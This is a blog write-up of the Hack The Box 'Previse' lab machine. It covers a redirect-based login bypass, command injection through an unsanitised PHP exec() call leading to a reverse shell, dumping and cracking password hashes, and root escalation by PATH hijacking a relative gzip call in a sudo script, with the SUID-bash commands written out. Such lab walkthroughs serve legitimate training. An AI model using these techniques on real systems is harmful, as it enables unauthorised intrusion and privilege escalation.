@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <title>Hack The Box - Previse writeup | Hakune Blog</title>
+
+  <meta charset="UTF-8">
+  <meta name="language" content="en">
+  <meta name="description" content="A writeup for Hack The Box - Previse machine">
+  <meta name="keywords" content="ctf , tech , htb , hack , cybersecurity">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Hack The Box - Previse writeup" />
+  <meta name="twitter:description" content="A writeup for Hack The Box - Previse machine"/>
+  <meta name="twitter:site" content="@akihakune" />
+  <meta name="twitter:creator" content="https://twitter.com/akihakune" />
+  
+
+  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
+
+
+  
+  
+    
+ 
+  
+  
+  
+  
+  
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/post.min.86d1effd4c412b85ac13db53a90c473a0f256f789b821e131125c9aa25cb6a6d.css" integrity="sha256-htHv/UxBK4WsE9tTqQxHOg8lb3ibgh4TESXJqiXLam0="/>
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
+  
+  
+   
+   
+    
+
+<script type="application/ld+json">
+  
+    {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/git-akihakune.github.io"
+      },
+      "articleSection" : "blog",
+      "name" : "Hack The Box - Previse writeup",
+      "headline" : "Hack The Box - Previse writeup",
+      "description" : "A writeup for Hack The Box - Previse machine",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-12-11 06:41:15 \u002b0700 \u002b07",
+      "dateModified" : "2021-12-11 06:41:15 \u002b0700 \u002b07",
+      "url" : "https:\/\/git-akihakune.github.io\/blog\/previse\/",
+      "wordCount" : "1163",
+      "keywords" : ["ctf", "tech", "htb", "hack", "cybersecurity", "Blog"]
+    }
+  
+  </script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-F8M24PKNWZ', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+</head>
+
+<body>
+  <div class="burger__container">
+  <div class="burger" aria-controls="navigation" aria-label="Menu">
+    <div class="burger__meat burger__meat--1"></div>
+    <div class="burger__meat burger__meat--2"></div>
+    <div class="burger__meat burger__meat--3"></div>
+  </div>
+</div>
+ 
+
+  <nav class="nav" id="navigation">
+  <ul class="nav__list">
+    
+    
+      <li>
+        <a  href="/">about</a>
+      </li>
+    
+      <li>
+        <a  class="active"
+         href="/blog">blog</a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <main>
+    
+    
+
+    <div class="flex-wrapper">
+      <div class="post__container">
+        <div class="post">
+          <header class="post__header">
+            <h1 id="post__title">Hack The Box - Previse writeup</h1>
+            <time datetime="2021-12-11 06:41:15 &#43;0700 &#43;07" class="post__date">Dec 11 2021</time> 
+          </header>
+          <article class="post__content">
+              
+<h4 id="author-aki-hakune">Author: Aki Hakune</h4>
+<p>Written on December 8th.</p>
+<hr>
+<h2 id="i-foothold">I. Foothold<a class="anchor" href="#i-foothold">#</a></h2>
+<p>It all began with a port scan:</p>
+<pre><code class="language-bash"># Nmap 7.92 scan initiated Mon Dec  6 22:10:41 2021 as: nmap -sC -sV -oN nmap.txt 10.10.11.104
+Nmap scan report for 10.10.11.104
+Host is up (0.64s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http?
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Dec  6 22:13:13 2021 -- 1 IP address (1 host up) scanned in 151.40 seconds
+</code></pre>
+<p>I also ran a quick <code>RustScan</code> and set up a background <code>nmap</code> full ports scan, but seems like those 2 are the only ports opening. Also, since their version seems up-to-date (at the time of writing), looks like there&rsquo;s no better attack vector than the web application.</p>
+<p><img src="/img/previse/login.png" alt=""></p>
+<p>We&rsquo;re greeted with this basic login form upon opening it in a web browser.</p>
+<p>To be honest, the first time I got there, someone&rsquo;d already pwned the system, and I easily managed to login using <code>admin:admin</code>. Not until I&rsquo;d got the box and getting round to write this writeup that I belatedly realized: hell, it should not have been that straight-forward. So it took me about half an hour more to figure out the proper way to log in.</p>
+<p>Checking browser&rsquo;s DevTool, we can clearly see that it just simply redirect us to <code>login</code> page if we&rsquo;re not logged in.</p>
+<p>So I fired up Burp Suite, intercepted the responses, change status from <code>302 Redirect</code> to <code>200 OK</code>, and I got in.</p>
+<p>Around this time, Gobuster returned with quite positive results:</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/ctf/htb/Previse]
+└─$ gobuster dir -x php -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.104
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2021/12/07 23:13:31 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]
+/download.php         (Status: 302) [Size: 0] [--&gt; login.php]   
+/login.php            (Status: 200) [Size: 2224]                
+/files.php            (Status: 302) [Size: 4914] [--&gt; login.php]
+/header.php           (Status: 200) [Size: 980]                 
+/nav.php              (Status: 200) [Size: 1248]                
+/footer.php           (Status: 200) [Size: 217]   
+...
+</code></pre>
+<p>I manually checked all <code>Status: 200</code> pages, and <code>nav.php</code> looked really promising.</p>
+<p><img src="/img/previse/nav.png" alt=""></p>
+<p>I reckoned that&rsquo;s to render the navigation bar, along with <code>header.php</code> and <code>footer.php</code>.</p>
+<p>Using the same Burp Suite technique, I got to <code>Account</code> and create an account of myself (later I realized that I didn&rsquo;t need to, and shouldn&rsquo;t have done that, since it&rsquo;ll leave traces in the database, and in real-world scenarios, getting caught like that is not good).</p>
+<p>After logged in, we can download uploaded files of other users. And an user uploaded something that looks like <a href="/data/previse/siteBackup.zip" 
+  
+  
+>the source code of this web app</a>.</p>
+<p>Before reading any further, you can try to grab the source code, and try to figure out the vulnerability by yourself!</p>
+<p>&hellip;</p>
+<p>Have you done that? What&rsquo;s the vulnerability? How long did it take?</p>
+<p>I reckon we all got the database credentials in <code>config.php</code> pretty quick:</p>
+<pre><code class="language-php">&lt;?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+?&gt;
+</code></pre>
+<p>However, it took me half an hour to stumble upon this line in <code>logs.php</code>:</p>
+<pre><code class="language-php">$output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}&quot;);
+</code></pre>
+<p>With no validation whatsover, there&rsquo;s a great chance that it&rsquo;s a command execution vulnerability via POST request.</p>
+<p>And so, I got back to Burp Suite, intercepted the request, sent it to repeater, trial and error (I mean, a lot of attempts), and finally got a reverse shell back.</p>
+<p>As expected, the reverse shell returned was owned by <code>www-data</code> which didn&rsquo;t provide much privilege. However, since we&rsquo;d already had the MySQL database credentials, it&rsquo;s not hard to get all the password hashes.</p>
+<pre><code class="language-sql">+----+------------+------------------------------------+
+| id | username   | password                           |
++----+------------+------------------------------------+
+|  1 | m4lwhere   | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. |
+|  2 | ouiouioui  | $1$🧂llol$bwR0QWQ73nPRaUpx0r2la1 |
+|  3 | cacapipi   | $1$🧂llol$oQSn/sA4G3L1zmOigOBq6. |
+|  4 | peter      | $1$🧂llol$.nhVJJDzQaIk8znez4dDH/ |
+|  5 | jappoo     | $1$🧂llol$JeN.ad9Ib9Gi/B.zMvpEm/ |
+|  6 | hacker     | $1$🧂llol$MHiYle9peb0qOKtGJWZ9S0 |
+|  7 | noobie     | $1$🧂llol$QJyUxlZ0gphAKveVeBYGk. |
+|  8 | fignupafya | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 |
+|  9 | lmaolmao   | $1$🧂llol$bT7q8rEMWewT0sa2T6FOx0 |
++----+------------+------------------------------------+
+</code></pre>
+<p>Also, take a look at <code>/etc/passwd</code>, we have:</p>
+<pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<p>So our target should be <code>m4lwhere</code> user.</p>
+<p>At this point, let&rsquo;s just run John the Ripper (which I personally prefer over Hashcat, since configuring hardware things for hashcat in a virtual environment is quite daunting), and we&rsquo;d got <code>m4lwhere</code> password.</p>
+<h2 id="ii-privilege-escalation">II. Privilege Escalation<a class="anchor" href="#ii-privilege-escalation">#</a></h2>
+<p>Logging in SSH with the credentials of <code>m4lwhere</code>, we&rsquo;d got the user flag. Now it&rsquo;s time for vertical privilege escalation!</p>
+<p>After some basic recons, this looks like the best shot we could have:</p>
+<pre><code class="language-bash">m4lwhere@previse:~$ sudo -l
+[sudo] password for m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+</code></pre>
+<p>So let&rsquo;s go for it!</p>
+<pre><code class="language-bash">m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
+</code></pre>
+<p>Can you spot the vulnerability? Are we seeing eye to eye, or looking at different things? :D</p>
+<p>I&rsquo;ve to admit, at first, I digged deep into the <code>date</code> hole. <code>date</code> binary can provide <a href="https://gtfobins.github.io/gtfobins/date/#sudo" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>file read access</a>, so I struggled to change the system date to my payload, without-root-access. It was pure hell. After giving up on it, I took another look at <code>access_backup.sh</code> and, god, why was I so blind about that relative <code>gzip</code>? What about path injection?</p>
+<p>At first, I tried to directly execute <code>/bin/bash</code> through that injection, but it didn&rsquo;t work. So I tried a a workaround.</p>
+<p>I copied <code>bash</code> to home, made a bash script that set SUID and change user of that binary, change <code>PATH</code> to inject it, and got root. Here&rsquo;s the script.</p>
+<pre><code class="language-bash">#!/usr/bin/bash
+chown root:root bash
+chmod +s bash
+</code></pre>
+<p>The whole process can be described as:</p>
+<pre><code class="language-bash">m4lwhere@previse:~$ cp /bin/bash ~
+m4lwhere@previse:~$ mv script.sh ~/gzip
+m4lwhere@previse:~$ export $PATH=/home/m4lwhere:$PATH
+m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
+m4lwhere@previse:~$ bash -p
+root@previse:/home/m4lwhere$ 
+</code></pre>
+<p>And that&rsquo;s it. The root flag! Don&rsquo;t forget to clean up your traces, for practicing purposes and for later players, everyone. :D</p>
+
+
+              
+          </article>
+          
+
+<ul class="tags__list">
+    
+    <li class="tag__item">
+        <a class="tag__link" href="https://git-akihakune.github.io/tags/ctf/">ctf</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://git-akihakune.github.io/tags/tech/">tech</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://git-akihakune.github.io/tags/english/">english</a>
+    </li></ul>
+
+ <div class="pagination">
+  
+    <a class="pagination__item" href="https://git-akihakune.github.io/blog/myleetcodejourney/">
+        <span class="pagination__label">Previous Post</span>
+        <span class="pagination__title">My Leetcode journey</span>
+    </a>
+  
+
+  
+</div>
+
+          
+          <footer class="post__footer">
+            
+
+
+<div class="social-icons">
+  
+     
+    
+      <a
+        class="social-icons__link"
+        title="Twitter"
+        href="https://twitter.com/akihakune"
+        target="_blank"
+        rel="me noopener"
+      >
+        <div class="social-icons__icon" style="background-image: url('https://git-akihakune.github.io/svg/twitter.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a
+        class="social-icons__link"
+        title="GitHub"
+        href="https://github.com/git-akihakune"
+        target="_blank"
+        rel="me noopener"
+      >
+        <div class="social-icons__icon" style="background-image: url('https://git-akihakune.github.io/svg/github.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a
+        class="social-icons__link"
+        title="Email"
+        href="mailto:akihakune@gmail.com"
+        target="_blank"
+        rel="me noopener"
+      >
+        <div class="social-icons__icon" style="background-image: url('https://git-akihakune.github.io/svg/email.svg')"></div>
+      </a>
+    
+     
+</div>
+
+            <p>© 2021</p>
+          </footer>
+          </div>
+      </div>
+      
+    </div>
+    
+
+  </main>
+
+   
+
+  
+  <script src="/js/index.min.575dda8d49ee02639942c63564273e6da972ab531dda26a08800bdcb477cbd7f.js" integrity="sha256-V13ajUnuAmOZQsY1ZCc&#43;balyq1Md2iagiAC9y0d8vX8=" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>
+
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
+    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>
+
+  
+
+
+</body>
+
+</html>
